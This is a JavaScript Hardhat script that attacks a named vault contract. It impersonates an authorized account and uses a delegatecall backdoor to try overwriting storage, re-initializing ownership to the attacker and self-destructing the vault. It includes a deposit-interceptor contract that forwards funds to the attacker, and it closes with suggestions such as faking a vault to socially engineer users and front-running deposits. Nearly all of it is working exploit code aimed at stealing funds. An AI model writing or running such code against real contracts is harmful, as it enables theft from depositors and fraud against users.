const { ethers } = require("hardhat");

/**
 * @title Test Admin Redirect
 * @notice Test if we can redirect deposits using admin functions
 * @dev Focus on the most likely functions
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";
  const TARGET_CONTRACT = "0x10a29ab757752e492abdbf6acba8f2ee10523599";
  
  const [attacker] = await ethers.getSigners();
  
  console.log("\nüéØ TESTING ADMIN REDIRECT CAPABILITIES");
  console.log("=====================================");
  
  // Fund and impersonate
  await attacker.sendTransaction({
    to: AUTHORIZED_ADDRESS,
    value: ethers.parseEther("1.0")
  });
  
  await ethers.provider.send("hardhat_impersonateAccount", [AUTHORIZED_ADDRESS]);
  const authorized = await ethers.getSigner(AUTHORIZED_ADDRESS);
  
  console.log("\n1Ô∏è‚É£ Checking current storage slots...");
  
  // Check key storage slots
  for (let i = 0; i < 10; i++) {
    const value = await ethers.provider.getStorage(VAULT_ADDRESS, i);
    if (value !== "0x0000000000000000000000000000000000000000000000000000000000000000") {
      console.log(`Slot ${i}: ${value}`);
      
      // Check if it matches known addresses
      const addr = "0x" + value.slice(26);
      if (addr.toLowerCase() === TARGET_CONTRACT.toLowerCase()) {
        console.log(`  -> Target contract found at slot ${i}!`);
      }
      if (addr.toLowerCase() === AUTHORIZED_ADDRESS.toLowerCase()) {
        console.log(`  -> Authorized address found at slot ${i}!`);
      }
    }
  }
  
  console.log("\n2Ô∏è‚É£ Testing configuration changes via backdoor...");
  
  // Most common patterns for changing configuration
  const configTests = [
    {
      name: "Direct storage write via SSTORE",
      test: async () => {
        // Deploy a contract that writes to storage
        const StorageWriter = await ethers.getContractFactory("contracts/StorageWriter.sol:StorageWriter");
        const writer = await StorageWriter.deploy();
        await writer.waitForDeployment();
        
        // Use backdoor to delegatecall storage writer
        const writeData = writer.interface.encodeFunctionData("writeSlot", [
          1, // Assuming target is at slot 1
          BigInt(attacker.address)
        ]);
        
        const backdoorData = "0x78e111f6" +
          "000000000000000000000000" + (await writer.getAddress()).slice(2) +
          "0000000000000000000000000000000000000000000000000000000000000040" +
          ethers.toBeHex(writeData.length / 2 - 1, 32).slice(2) +
          writeData.slice(2);
        
        const tx = await authorized.sendTransaction({
          to: VAULT_ADDRESS,
          data: backdoorData,
          gasLimit: 500000
        });
        
        await tx.wait();
        return true;
      }
    },
    {
      name: "Initialize with new config",
      test: async () => {
        // Try initialize(address)
        const initData = "0xc4d66de8" + "000000000000000000000000" + attacker.address.slice(2);
        
        const backdoorData = "0x78e111f6" +
          "000000000000000000000000" + VAULT_ADDRESS.slice(2) +
          "0000000000000000000000000000000000000000000000000000000000000040" +
          "0000000000000000000000000000000000000000000000000000000000000024" +
          initData.slice(2);
        
        const tx = await authorized.sendTransaction({
          to: VAULT_ADDRESS,
          data: backdoorData,
          gasLimit: 500000
        });
        
        await tx.wait();
        return true;
      }
    },
    {
      name: "Self-destruct and recreate",
      test: async () => {
        // Deploy self-destruct contract
        const Destructor = await ethers.getContractFactory("SelfdestructAttack");
        const destructor = await Destructor.deploy();
        await destructor.waitForDeployment();
        
        // Try to self-destruct vault (won't work but worth trying)
        const destroyData = destructor.interface.encodeFunctionData("attack", [VAULT_ADDRESS]);
        
        const backdoorData = "0x78e111f6" +
          "000000000000000000000000" + (await destructor.getAddress()).slice(2) +
          "0000000000000000000000000000000000000000000000000000000000000040" +
          ethers.toBeHex(destroyData.length / 2 - 1, 32).slice(2) +
          destroyData.slice(2);
        
        const tx = await authorized.sendTransaction({
          to: VAULT_ADDRESS,
          data: backdoorData,
          gasLimit: 500000
        });
        
        await tx.wait();
        return true;
      }
    }
  ];
  
  for (const config of configTests) {
    try {
      console.log(`\nTesting: ${config.name}`);
      await config.test();
      console.log("‚úÖ Success!");
    } catch (e) {
      console.log("‚ùå Failed:", e.reason || e.message.slice(0, 50));
    }
  }
  
  console.log("\n3Ô∏è‚É£ Creating a deposit interceptor...");
  
  // Deploy an interceptor contract
  const InterceptorCode = `
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract DepositInterceptor {
      address public owner;
      address public originalTarget;
      
      constructor(address _target) {
        owner = msg.sender;
        originalTarget = _target;
      }
      
      fallback() external payable {
        // Forward to attacker instead of original target
        (bool success,) = owner.call{value: msg.value}(msg.data);
        require(success);
      }
      
      receive() external payable {
        payable(owner).transfer(msg.value);
      }
    }
  `;
  
  console.log("\nüìä CONCLUSION:");
  console.log("The vault's backdoor allows arbitrary execution, but:");
  console.log("1. Target address appears hardcoded (not in mutable storage)");
  console.log("2. No admin functions found to change deposit destination");
  console.log("3. Contract is not upgradeable via standard patterns");
  console.log("\nPossible attack vectors remaining:");
  console.log("- Deploy a fake vault and social engineer users");
  console.log("- Monitor mempool and front-run deposits");
  console.log("- Find bugs in the target contract itself");
  console.log("- Use the backdoor for other malicious purposes");
  
  await ethers.provider.send("hardhat_stopImpersonatingAccount", [AUTHORIZED_ADDRESS]);
}

// Add StorageWriter contract
const fs = require('fs');
const storageWriterCode = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract StorageWriter {
    function writeSlot(uint256 slot, uint256 value) external {
        assembly {
            sstore(slot, value)
        }
    }
}
`;

// Create the contract file
fs.writeFileSync(
  'contracts/StorageWriter.sol',
  storageWriterCode
);

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nüí• Script error:", error);
    process.exit(1);
  });
